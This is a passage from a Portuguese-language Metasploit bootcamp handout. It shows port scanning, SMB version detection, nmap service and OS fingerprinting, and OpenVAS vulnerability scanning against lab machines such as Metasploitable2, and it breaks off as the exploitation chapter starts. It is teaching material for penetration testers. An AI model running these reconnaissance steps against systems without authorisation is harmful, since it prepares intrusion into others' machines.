auxiliary(tcp) > set ports 1-1000 ports => 1-1000 Vamos agora verificar todas as opções que serão aplicadas a este módulo, como configuramos e as opções que já estão configuradas por padrão. Digite no msfconsole: 248<br /> <br /> msf auxiliary(tcp) > show options Module options (auxiliary/scanner/portscan/tcp): Name Current Setting Required Description ------ --------- -------- ----------CONCURRENCY 10 yes The number of concurrent ports to check per host DELAY 0 yes The delay between connections, per thread, in milliseconds JITTER 0 yes The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds. PORTS 1-1000 yes Ports to scan (e.g. 22-25,80,110-900) RHOSTS 172.16.0.12 yes The target address range or CIDR identiﬁer THREADS 1 yes The number of concurrent threads TIMEOUT 1000 yes The socket connect timeout in milliseconds<br /> <br /> msf auxiliary(tcp) > Observe que ele apresentou na tela as opções com as nossas configurações indicadas. Agora vamos iniciar o scanner através do comando de execução. Digite no msfconsole: msf auxiliary(tcp) > run [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12:<br /> <br /> - 172.16.0.12:21 - TCP OPEN - 172.16.0.12:25 - TCP OPEN - 172.16.0.12:23 - TCP OPEN - 172.16.0.12:22 - TCP OPEN - 172.16.0.12:53 - TCP OPEN - 172.16.0.12:80 - TCP OPEN - 172.16.0.12:111 - TCP OPEN - 172.16.0.12:139 - TCP OPEN<br /> <br /> 249<br /> <br /> [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12: [*] 172.16.0.12:<br /> <br /> - 172.16.0.12:445 - TCP OPEN - 172.16.0.12:512 - TCP OPEN - 172.16.0.12:514 - TCP OPEN - 172.16.0.12:513 - TCP OPEN<br /> <br /> [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(tcp) ><br /> <br /> Observe que ele apresentou todas as portas abertas entre o range 1-1000 que indicamos do IP 172.16.0.12. Agora vamos realizar o teste de scan em um serviço específico, o SMB (Server Message Block), serviço de compartilhamento de arquivos em rede. Vamos utilizar a nossa máquina Windows para ser o alvo, esta máquina está configurada para compartilhar arquivos na rede. Podemos realizar uma busca genérica digitando no msfconsole: msf auxiliary(tcp) > search smb ... Porém, como vimos anteriormente. este comando realiza uma busca em todo o banco de dados, trazendo inúmeros módulos com SMB em sua descrição. Vamos realizar uma busca indicando o local apropriado para realizar a busca neste momento, digite no msfconsole: msf auxiliary(tcp) > search auxiliary/scanner/smb Matching Modules ================ Name Disclosure Date Rank<br /> <br /> Description<br /> <br /> 250<br /> <br /> --------------- ---- ----------auxiliary/scanner/smb/pipe_auditor normal SMB Session Pipe Auditor auxiliary/scanner/smb/pipe_dcerpc_auditor normal SMB Session Pipe DCERPC Auditor auxiliary/scanner/smb/psexec_loggedin_users normal Microsoft Windows Authenticated Logged In Users Enumeration auxiliary/scanner/smb/smb2 normal SMB 2.0 Protocol Detection auxiliary/scanner/smb/smb_enum_gpp normal SMB Group Policy Preference Saved Passwords Enumeration auxiliary/scanner/smb/smb_enumshares normal SMB Share Enumeration auxiliary/scanner/smb/smb_enumusers normal SMB User Enumeration (SAM EnumUsers) auxiliary/scanner/smb/smb_enumusers_domain normal SMB Domain User Enumeration auxiliary/scanner/smb/smb_login normal SMB Login Check Scanner auxiliary/scanner/smb/smb_lookupsid normal SMB SID User Enumeration (LookupSid) auxiliary/scanner/smb/smb_uninit_cred normal Samba _netr_ServerPasswordSet Uninitialized Credential State auxiliary/scanner/smb/smb_version normal SMB Version Detection msf auxiliary(tcp) ><br /> <br /> Observe que ele apresentou somente os módulos dentro do diretório que nós indicamos. Vamos utilizar o módulo para descobrir a versão do SMB que está sendo utilizada na máquina Windows, o módulo auxiliary/scanner/smb/smb_version. Digite no msfconsole: msf auxiliary(tcp) > use auxiliary/scanner/smb/ smb_version 251<br /> <br /> Vamos verificar as informações relativas a este módulo, digite: msf auxiliary(smb_version) > info Name: SMB Version Detection Module: auxiliary/scanner/smb/smb_version License: Metasploit Framework License (BSD) Rank: Normal Provided by: hdm Basic options: Name Current Setting Required Description ------ --------- -------- ----------RHOSTS yes The target address range or CIDR identiﬁer SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the speciﬁed username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads Description: Display version information about each system msf auxiliary(smb_version) ><br /> <br /> Vamos configurar apenas a opção RHOSTS, para indicar a máquina Windows como alvo a ser analisado, digite no msfconsole: msf auxiliary(smb_version) > set rhosts 172.16.0.19 rhosts => 172.16.0.19 252<br /> <br /> Verifique as opções que estão configuradas e, para serem executadas, digite no console: msf auxiliary(smb_version) > run [*] 172.16.0.19:445 - Host is running Windows 7 Professional SP1 (build:7601) (name:WIN01) (workgroup:WORKGROUP ) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(smb_version) > Observe que ele retornou o scanner da porta SMB (445), a versão do sistema operacional, a build, nome e grupo de trabalho da rede. Obtivemos sucesso nesta verificação. No scanning da máquina Metasploitable2 verificamos que o serviço SMB na porta 445 também está ativo, vamos utilizar este módulo, SMB_version, para verificar o que ele irá retornar em uma máquina Linux, digite no msfconsole: msf auxiliary(smb_version) > set rhosts 172.16.0.12 rhosts => 172.16.0.12 Configuramos a máquina Metasploitable2 como alvo, agora vamos executar o módulo: msf auxiliary(smb_version) > run [*] 172.16.0.12:445 - Host could not be identified: Unix (Samba 3.0.20-Debian) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(smb_version) > 253<br /> <br /> Observe que nesta máquina, ele não retornou a versão do sistema operacional, porém trouxe a informação de que está sendo utilizando um sistema operacional da plataforma Unix e trouxe a versão do samba que está sendo utilizado. Podemos utilizar alguns desses comandos para verificar informações sobre o uso deste exploit até o momento, portanto, digite no msfconsole: msf auxiliary(smb_version) > hosts Hosts ===== address mac name os_name os_ﬂavor os_sp purpose info comments --------- ----- ------- ---- -------172.16.0.12 Unknown device 172.16.0.19 WIN01 Windows 7 Professional SP1 client 193.248.250.121 msf auxiliary(smb_version) > Observe que ele retornou as informações organizadas das duas máquinas que executamos esse exploit, trouxe informações do IP, nome da máquina versão do SO e versão do serviço. Podemos também utilizar o comando services, para verificar todos os serviços que foram escaneados, com os exploits utilizados até o momento. Digite no msfconsole: msf auxiliary(smb_version) > services -u Services ======== 254<br /> <br /> host port proto name state info ------- ----- ---- ----- ---172.16.0.12 21 tcp open 172.16.0.12 22 tcp open 172.16.0.12 23 tcp open 172.16.0.12 25 tcp open 172.16.0.12 53 tcp open 172.16.0.12 80 tcp open 172.16.0.12 111 tcp open 172.16.0.12 139 tcp open 172.16.0.12 445 tcp smb open Unix (Samba 3.0.20Debian) 172.16.0.12 512 tcp open 172.16.0.12 513 tcp open 172.16.0.12 514 tcp open 172.16.0.19 445 tcp smb open Windows 7 Professional SP1 (build:7601) (name:WIN01) (workgroup:WORKGROUP ) msf auxiliary(smb_version) > O comando services com a opção -u nos apresentou todos as portas abertas que foram escaneadas pelo exploits use auxiliary/scanner/portscan/tcp e auxiliary/scanner/smb/smb_version. Fonte: Vide aula TDI – BootCamp de Metasploit –Metasploit Scanning<br /> <br /> 3.<br /> <br /> NMAP Scanning<br /> <br /> O nmap possui uma série de flags e parâmetros que podem ser utilizados para que sua exploração fique completa de acordo com a coleta de análise que você irá realizar.<br /> <br /> 255<br /> <br /> Para uma análise de vulnerabilidade ser bem-sucedida é interessante que colete todas as informações possíveis e sejam obtidas da melhor forma. O nmap possui ferramentas para detecção de serviço, SO, portas firewall e inúmeras outras opções. Verifique o manual (man nmap) para mais detalhes. Vamos realizar alguns testes, inicie a máquina Metasploitable2 para ser nosso alvo e abra o terminal do Kali Linux e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="01736e6e75416a606d68">[email&#160;protected]</a>:~# nmap -F 172.16.0.12 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-31 10:04 BST Nmap scan report for 172.16.0.12 Host is up (0.00016s latency). Not shown: 82 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 23/tcp open telnet 25/tcp open smtp 53/tcp open domain 80/tcp open http ... MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds -F : Escaneia as 100 portas mais comuns (FAST). Realize uma pesquisa rápida, utilizada para apenas verificar as 1000 portas mais comuns. Vamos agora realizar uma ping scan com o nmap, digite: 256<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b4c6dbdbc0f4dfd5d8dd">[email&#160;protected]</a>:~# nmap -sn 172.16.0.12 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-31 10:05 BST Nmap scan report for 172.16.0.12 Host is up (0.00036s latency). MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds -sn: Ping Scan desabilita a varredura de portas, neste caso em um IP especifico. Observe que desta forma ele realizou uma varredura ICMP e trouxe apenas informações como nome da máquina, IP, latência e MAC address. Podemos também realizar um ping scan em toda a rede, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a8dac7c7dce8c3c9c4c1">[email&#160;protected]</a>:~# nmap -sn 172.16.0.0/24 Starting Nmap 7.40 (https://nmap.org) at 2017-05-31 10:06 BST Nmap scan report for 172.16.0.1 Host is up (0.00088s latency). MAC Address: 58:6D:8F:E4:79:F0 (Cisco-Linksys) Nmap scan report for 172.16.0.10 Host is up (0.00021s latency). MAC Address: 3C:97:0E:8C:73:CF (Wistron InfoComm(Kunshan)Co.) Nmap scan report for 172.16.0.11 Host is up (0.0018s latency). MAC Address: C4:95:A2:0F:07:94 (Shenzhen Weijiu Industry AND Trade Development) Nmap scan report for 172.16.0.12 Host is up (0.00032s latency).<br /> <br /> 257<br /> <br /> MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) Nmap scan report for 172.16.0.15 Host is up. Nmap scan report for 172.16.0.21 Host is up. Nmap done: 256 IP addresses (6 hosts up) scanned in 2.04 seconds -sn: Ping Scan desabilita a varredura de portas, neste caso em toda a rede. Observe que o nmap retornou o IP, MAC e nome de todos os dispositivos da rede. Vamos agora realizar um scan especificando, um range de portas de um determinado IP, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2c5e4343586c474d4045">[email&#160;protected]</a>:~# nmap -n -p1000-65535 172.16.0.12 Starting Nmap 7.40 (https://nmap.org) at 2017-05-31 10:11 BST Nmap scan report for 172.16.0.12 Host is up (0.00021s latency). Not shown: 64518 closed ports PORT STATE SERVICE 1099/tcp open rmiregistry 1524/tcp open ingreslock 2049/tcp open nfs 2121/tcp open ccproxy-ftp 3306/tcp open mysql 3632/tcp open distccd 5432/tcp open postgresql 5900/tcp open vnc 6000/tcp open X11 6667/tcp open irc 6697/tcp open ircs-u 8009/tcp open ajp13 8180/tcp open unknown 258<br /> <br /> 8787/tcp open msgsrvr 36727/tcp open unknown 44148/tcp open unknown 47944/tcp open unknown 60000/tcp open unknown MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 3.37 seconds -n: Indica ao nmap para não resolver nomes das máquinas. -p1000-65535: Indica ao nmap para realizar um scanner em um range de portas especifico, neste caso da porta 1000 até 65535, no IP 172.16.0.12. Observe que desta forma temos melhor controle das portas que foram escaneadas. Vamos realizar scanner mais complexos, com o seguinte cenário, sambemos que as portas 21 e 22 estão abertas e queremos então descobrir a versão do serviço e do SO, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9deff2f2e9ddf6fcf1f4">[email&#160;protected]</a>:~# nmap -O -sV 172.16.0.12 Starting Nmap 7.40 (https://nmap.org) at 2017-05-31 10:13 BST Nmap scan report for 172.16.0.12 Host is up (0.00045s latency). Not shown: 977 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 23/tcp open telnet Linux telnetd 25/tcp open smtp Postfix smtpd 53/tcp open domain ISC BIND 9.4.2 259<br /> <br /> 80/tcp open http 2)<br /> <br /> Apache httpd 2.2.8 ((Ubuntu) DAV/<br /> <br /> ... MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.33 Network Distance: 1 hop Service Info: Hosts: metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/ o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds -O: Indica ao nmap para realizar uma varredura da versão do SO da máquina. -sV: Indica ao nmap para realizar uma varredura procurando as versões dos serviços, neste caso, no IP 172.16.0.12. Observe que o nmap apresentou o nome e versões dos serviços executados nas portas abertas, além de trazer a versão do SO e possíveis versões do kernel. A coleta de informações como versões e portas abertas é de extrema importância em uma exploração para realizar um ataque, pois este comando é de grande utilidade para atacantes. Com isto podemos buscar exploits para tentar um ganho de acesso no sistema alvo. Podemos integrar o nmap com o Metasploit Framework (msfconsole). Para isso podemos importar um arquivo .xml gerado pelo nmap e 260<br /> <br /> realizar a leitura deste arquivo no msfconsole, digite no terminal do Kali Linux: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8efce1e1facee5efe2e7">[email&#160;protected]</a>:~# nmap -A -p- -oX /root/nmap-172.16.0.12.xml 172.16.0.12 Starting Nmap 7.40 (https://nmap.org) at 2017-05-31 10:17 BST Nmap scan report for 172.16.0.12 Host is up (0.00054s latency). Not shown: 65505 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 23/tcp open telnet Linux telnetd ... MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.33 Network Distance: 1 hop Service Info: Hosts: metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/ o:linux:linux_kernel Host script results: |_clock-skew: mean: 1s, deviation: 0s, median: 0s 261<br /> <br /> |_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: , NetBIOS MAC: (unknown) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | NetBIOS computer name: | Workgroup: WORKGROUP\x00 |_ System time: 2017-05-31T05:19:45-04:00 TRACEROUTE HOP RTT ADDRESS 1 0.54 ms 172.16.0.12 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 209.52 seconds -A : Ativar detecção de SO, versão, verificação de script e traceroute. -p- : Indica ao nmap para scanner todas as portas, 65535. -oX /root/nmap-172.16.0.12.xml : Indica o nmap para adicionar a saída do comando para um arquivo .xml, neste caso o arquivo com o nome nmap-172.16.0.12.xml no diretório /root. Observe que ele imprimiu na tela as informações detalhadas do host com o IP 172.16.0.12. Verifique se o arquivo foi gerado no diretório que indicamos / root. Agora vamos realizar a leitura deste arquivo através do msfconsole. Digite o comando no console: msf > db_import /root/nmap-172.16.0.12.xml [*] Importing 'Nmap XML' data [*] Import: Parsing with 'Nokogiri v1.7.2' [*] Importing host 172.16.0.12 262<br /> <br /> [*] Successfully imported /root/nmap-172.16.0.12.xml msf > db_import: Realiza a importação do arquivo nmap-172.16.0.12.xml para o msfconsole. O arquivo .xml foi importado com sucesso, podemos então, verificar o arquivo. Vamos verificar as portas abertas dos serviços neste arquivo. Digite no msfconsole: msf > services -u Services ======== host port proto name state info ------- ----- -------172.16.0.12 21 tcp ftp open vsftpd 2.3.4 172.16.0.12 22 tcp ssh open OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0 172.16.0.12 23 tcp telnet open Linux telnetd 172.16.0.12 25 tcp smtp open Postﬁx smtpd 172.16.0.12 53 tcp domain open ISC BIND 9.4.2 172.16.0.12 80 tcp http open Apache httpd 2.2.8 (Ubuntu) DAV/2 172.16.0.12 111 tcp rpcbind open 2 RPC #100000 ... services : Apresenta o conteúdo do arquivo .xml, exibindo as portas e serviços do arquivo .xml que foi importado. -u: Indica ao services para apenas apresentar as portas abertas do arquivo .xml. Observe que este comando foi apresentado semelhante ao nmap -O -sV 172.16.0.12. 263<br /> <br /> Podemos também utilizar o módulo do Metasploit que utiliza o nmap como um plugin. Digite no terminal: msf > db_nmap -p21 172.16.0.12 [*] Nmap: Starting Nmap 7.40 (https://nmap.org) at 2017-05-31 10:36 BST [*] Nmap: Nmap scan report for 172.16.0.12 [*] Nmap: Host is up (0.00028s latency). [*] Nmap: PORT STATE SERVICE [*] Nmap: 21/tcp open ftp [*] Nmap: MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds db_nmap: Indica ao msfconsole para utilizar o comando nmap dentro da console. Observe que ele trouxe as informações do mesmo modo quando usado no terminal do Kali Linux. Fonte: Videoaula TDI – BootCamp de Metasploit –NMAP Scanning<br /> <br /> 4.<br /> <br /> OpenVAS Scanning<br /> <br /> O OpenVAS é um explorador de vulnerabilidades e podemos utilizá-lo através da interface gráfica web. Ele possui opções que apresentam as vulnerabilidades dos hosts e detalhes sobre essas vulnerabilidades. Vamos agora iniciar do serviço OpenVAS, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a7d5c8c8d3e7ccc6cbce">[email&#160;protected]</a>:~# openvas-start Starting OpenVas Services Acesse ao OpenVAS através do navegador web na seguinte página: 264<br /> <br /> https://127.0.0.1:9392 Entre com o usuário admin e a senha obtida na configuração do OpenVAS. Ele irá apresentar na tela o dashboard (o OpenVAS tem uma página dedicada para apresentar todo o seu conteúdo). Para acessar, clique na aba Help e clique na opção Contents:<br /> <br /> É muito importante entender o conteúdo Tasks, pois nele contém informações para que possamos entender a análise realizada pelo OpenVAS. Esta página pode ser acessa no seguinte endereço: https://127.0.0.1:9392/help/tasks.html Observe a sessão Status. Podemos verificar os ícones e a descrição de cada um:<br /> <br /> 265<br /> <br /> Verifique a sessão Severity. Ela apresenta o grau de severidade de uma vulnerabilidade:<br /> <br /> Outra sessão que demos nos atentar é a Trend, pois ela apresenta informações sobre a vulnerabilidade ao longo do tempo.<br /> <br /> 266<br /> <br /> Observe na lista a sessão Actions, na qual podemos verificar a descrição das ações que podemos realizar em um host explorado:<br /> <br /> Vamos agora iniciar o scan em uma máquina, neste caso iremos utilizar a máquina Metasploitable2. Clique na aba Scan e logo em seguida na opção Tasks. Veja o exemplo abaixo:<br /> <br /> Caso seja sua primeira vez realizando um scan com o OpenVAS, ele irá apresentar um modo auxiliando 267<br /> <br /> como realizar o primeiro scan. Siga os passos e você irá obter a seguinte tela:<br /> <br /> Insira o IP da máquina alvo e clique em Start Scan. Após a finalização da configuração do scan, ele irá apresentar as informações do processo no dashboard. Veja o exemplo abaixo:<br /> <br /> 268<br /> <br /> Observe que ele está realizando o scan na máquina 172.16.0.12 e apresenta o status do scan de exploração na máquina, o total de vulnerabilidades encontradas, a severidade (severity), a tendência (trend) e as ações (Actions) que podemos realizar nas vulnerabilidades deste host. Podemos clicar no nome da máquina e ele irá apresentar informações detalhadas sobre o scan:<br /> <br /> Nesta tela podemos verificar informações como o tipo de scan que está sendo realizado - neste caso full and fast - o total de resultados encontrados até o momento, e o status da verificação. Nós só iremos poder colher os dados obtidos após a finalização da verificação. Quando o Status estiver finalizado, done, clique no número que aparece na linha Results e ele irá apresentar o dashboard com detalhes sobre o scan:<br /> <br /> 269<br /> <br /> Ele apresenta alguns gráficos gerais de todas as vulnerabilidades encontradas na máquina. Logo mais abaixo, podemos observar as vulnerabilidades com detalhes:<br /> <br /> Observe que na coluna Severity e QoD ele apresenta a porcentagem de risco da vulnerabilidade, estas são testadas com base na CVE (Common Vulnerabilities and Exposures), apresentando a porcentagem de risco testado. Para saber mais sobre a vulnerabilidade, clique no nome da mesma:<br /> <br /> 270<br /> <br /> Podemos exportar este relatório para o formato .xml para que possamos realizar a integração com o Metasploit Framework e explorar estas vulnerabilidades mais a fundo. Para isto clique no ícone de download no canto superior esquerdo da página:<br /> <br /> Agora, inicie o Metasploit Framework (msfconsole), digite no terminal do Kali Linux: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b9cbd6d6cdf9d2d8d5d0">[email&#160;protected]</a>:~# msfconsole 271<br /> <br /> ...<br /> <br /> =[ metasploit v4.14.1-dev ] + =[ 1628 exploits - 927 auxiliary - 282 post] + =[ 472 payloads - 39 encoders - 9 nops]<br /> <br /> msf > Após iniciado, vamos agora importar o arquivo .xml gerado pelo OpenVAS. Digite no console: msf > db_import /root/Downloads/ result-1cdb4306-8956-4f07-a799-712a8989f5d2.xml [*] Importing 'OpenVAS XML' data [*] Successfully imported /root/Downloads/ result-1cdb4306-8956-4f07-a799-712a8989f5d2.xml msf > Observe que o arquivo foi importado com sucesso, agora podemos realizar análises nestes resultados através do msfconsole. Vamos verificar os serviços que foram analisados neste arquivo. Digite no console: msf > services Services ======== host port proto name state info -- ---- ----- -------- ---172.16.0.12 21 tcp ftp open vsftpd 2.3.4 172.16.0.12 22 tcp ssh open OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0 172.16.0.12 23 tcp telnet open Linux telnetd 172.16.0.12 25 tcp smtp open Postfix smtpd 172.16.0.12 53 tcp domain open ISC BIND 9.4.2 272<br /> <br /> 172.16.0.12 80 tcp http open Apache httpd 2.2.8 (Ubuntu) DAV/2 172.16.0.12 111 tcp rpcbind open 2 RPC #100000 ... Ele apresenta o IP, porta, protocolo, nome, estado e informações de banners. Podemos, assim, verificar as vulnerabilidades que o host apresentou. Digite no console: msf > vulns Podemos também fazer com que os módulos do OpenVAS sejam carregados no msfconsole. Digite no console: msf > load openvas [*] Welcome to OpenVAS integration by kost and averagesecurityguy. [*] [*] OpenVAS integration requires a database connection. Once the [*] database is ready, connect to the OpenVAS server using openvas_connect. [*] For additional commands use openvas_help. [*] [*] Successfully loaded plugin: OpenVAS msf > Após carregados, podemos verificar os comandos que podemos utilizar com os módulos do OpenVAS. Digite no console: msf > openvas_help [*] openvas_help<br /> <br /> Display this help 273<br /> <br /> [*] openvas_debug Enable/Disable debugging [*] openvas_version Display the version of the OpenVAS server [*] [*] CONNECTION [*] ========== [*] openvas_connect Connects to OpenVAS [*] openvas_disconnect Disconnects from OpenVAS [*] [*] TARGETS [*] ======= [*] openvas_target_create Create target [*] openvas_target_delete Deletes target speciﬁed by ID [*] openvas_target_list Lists targets [*] [*] TASKS [*] ===== [*] openvas_task_create Create task [*] openvas_task_delete Delete a task and all associated reports [*] openvas_task_list Lists tasks [*] openvas_task_start Starts task speciﬁed by ID [*] openvas_task_stop Stops task speciﬁed by ID [*] openvas_task_pause Pauses task speciﬁed by ID [*] openvas_task_resume Resumes task speciﬁed by ID [*] openvas_task_resume_or_start Resumes or starts task speciﬁed by ID [*] [*] CONFIGS [*] ======= [*] openvas_conﬁg_list Lists scan conﬁgurations [*] [*] FORMATS [*] ======= [*] openvas_format_list Lists available report formats [*] 274<br /> <br /> [*] REPORTS [*] ======= [*] openvas_report_list Lists available reports [*] openvas_report_delete Delete a report speciﬁed by ID [*] openvas_report_import Imports an OpenVAS report speciﬁed by ID [*] openvas_report_download Downloads an OpenVAS report speciﬁed by ID msf > Estes são os comandos que podemos utilizar com o OpenVAS integrado com o msfconsole. Uma outra forma de uso do OpenVAS é através da shell do terminal no Kali Linux. Para saber mais sobre o uso desta ferramenta na shell, digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4c3e2323380c272d2025">[email&#160;protected]</a>:~# omp --help<br /> <br /> Usage: omp [OPTION…] - OpenVAS OMP Command Line Interface Help Options: -?, --help Application Options: -h, --host= -p, --port= -V, --version -v, --verbose passwords).<br /> <br /> Show help options Connect to manager on host Use port number Print version. Verbose messages (WARNING: may reveal<br /> <br /> ...<br /> <br /> O omp é a interface de comunicação via shell do gerenciamento do OpenVAS. Podemos utilizar o comando omp juntamente com as flags apresentadas para realizar o scan sem a necessidade de acessar a interface gráfica pelo navegador web. 275<br /> <br /> Fonte: Videoaula TDI – BootCamp de Metasploit – OpenVAS Scanning<br /> <br /> 5.<br /> <br /> Análise de vulnerabilidades<br /> <br /> Através dos dados coletados é importante traçarmos alguns objetivos a serem concluídos. Esses objetivos irão nos ajudar a identificar vulnerabilidades na exploração para que possamos ter êxito no processo. 5.1.<br /> <br /> Encontrando valor nos dados<br /> <br /> Durante a análise de vulnerabilidade, podem surgir problemas e situações em que temos que utilizar outros caminhos para continuar a exploração. É interessante fazermos um relatório constando todos os métodos, ações realizadas, situações concluídas de modo que possamos conseguir entregar um relatório de valor para um cliente, no caso de um pentest. Por exemplo durante a análise de vulnerabilidade, é importante procuramos informações em base de dados de exploits de vulnerabilidades, quais informações temos sobre a vulnerabilidade e qual o tipo de falhas que esta vulnerabilidade oferece. Com todas estas informações documentadas, podemos garantir a validação dos processos realizados e nos orientar melhor durante o processo de exploração. Ainda assim é importante procurar informações em fornecedores de notificações de vulnerabilidades, realizar buscas em fóruns, guias de configurações, manuais e documentação de fornecedores. Dessa forma, além de obter êxito na exploração, agregamos valor à documentação. Toda e qualquer informação é bem-vinda ao relatório, desde que seja organizada e 276<br /> <br /> tenha base, como fornecedores das aplicações, empresas especialistas em segurança, entre outros. Uma vez com a vulnerabilidade encontrada é importante a reprodução da mesma em um ambiente de homologação, ou seja, devemos criar um ambiente apropriado para a validação da exploração de uma vulnerabilidade de modo que não afete o ambiente de produção de um cliente. Uma vez realizado este processo podemos aplicar inúmeros testes e sanar o problema para a vulnerabilidade explorada, sendo possível passar um laudo completo para o cliente. 5.2.<br /> <br /> Recursos de Investigação<br /> <br /> Alguns sites trazem informações importantes e falhas mais comuns que podemos encontrar atualmente. Veja alguns desses sites abaixo:<br /> <br /> National Vulnerability Database https://nvd.nist.gov/ É um dos sites mais conceituados em relação aos tipos de vulnerabilidades. Nesse site é possível encontrar CVEs atualizados.<br /> <br /> Offensive Security’s Exploit Database https://www.exploit-db.com/ Este site possui exploits, shellcode, Google Hacking, Security Papers. O exploit-db pode ser comparado com a CVE, porém voltado somente para exploits.<br /> <br /> Rapid7’s Vulnerability and Modules Database 277<br /> <br /> https://www.rapid7.com/ Site que mantém a base de dados dos exploits, módulos, payloads do Metasploit Framework.<br /> <br /> Bugstraq list archives http://seclists.org/ Site que realiza notificações de vulnerabilidades atuais e possui um acervo que podemos realizar pesquisas de vulnerabilidades. 5.3.<br /> <br /> Sugestões de Fluxo de trabalho<br /> <br /> Veja algumas sugestões para utilizar durante a exploração de vulnerabilidades:<br /> <br /> - Colete dados com o maior número de ferramentas que você tiver o conhecimento; - Organize as informações de forma clara para o entendimento posterior; - Classifique e pesquise os dados a serem explorados; - Procure por sistemas identificados, portas e vulnerabilidades; - Explore dentro da base de exploits do Metasploit potenciais exploits. Dessa forma, é possível obter êxito e obter um teste de explorações confiável. Sendo assim, você pode criar a sua metodologia de exploração seguindo estas sugestões. Fonte: Videoaula TDI – BootCamp de Metasploit – Análise de vulnerabilidades<br /> <br /> 278<br /> <br /> 6.<br /> <br /> Ganhando Acesso ao Sistema<br /> <br /> 6.1.<br /> <br /> O Processo de Exploração<br /> <br /> O processo de exploração consiste em uma máquina atacante e uma máquina alvo. Este alvo será explorado, suas vulnerabilidades e o atacante irá tentar realizar ataques no alvo, utilizando exploits e payloads para ganhar acesso à máquina alvo. O Metasploit Framework pode nos auxiliar em toda esta ação, pois ele explora uma vulnerabilidade em um alvo, cria e executa payloads, e disponibiliza ferramentas para a interpretação de comandos na shell entre o alvo e o atacante. Fonte: Videoaula TDI – BootCamp de Metasploit – O Processo de Exploração<br /> <br /> 6.2.<br /> <br /> Exploits<br /> <br /> Um exploit é um dado criado para explorar vulnerabilidades em hosts ou serviços. Os exploits são utilizados para explorar aplicações e serviços e de fato conseguir acesso ao sistema, ou seja, não necessitamos inserir algum payload atrelado a este exploit para que possamos explorar alguma vulnerabilidade. O processo consiste na aplicação ou no fato de o serviço conter alguma falha e essa poder ser explorada através de alguns códigos que um determinado exploit foi criado com este propósito. Assim, conseguimos acesso à máquina. Vamos iniciar uma máquina Metasploitable2. Abra o terminal do Kali Linux e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6f1d00001b2f040e0306">[email&#160;protected]</a>:~# service postgresql start Com o PostgreSQL iniciado, digite no terminal: 279<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f785989883b79c969b9e">[email&#160;protected]</a>:/home/madvan# msfconsole ...<br /> <br /> Love leveraging credentials? Check out bruteforcing in Metasploit Pro -- learn more on http://rapid7.com/metasploit =[ metasploit v4.14.1-dev ] + =[ 1628 exploits - 927 auxiliary - 282 post] + =[ 472 payloads - 39 encoders - 9 nops] + =[ Free Metasploit Pro trial: http://r-7.co/trymsp ]<br /> <br /> msf > Vamos utilizar o nmap atrelado 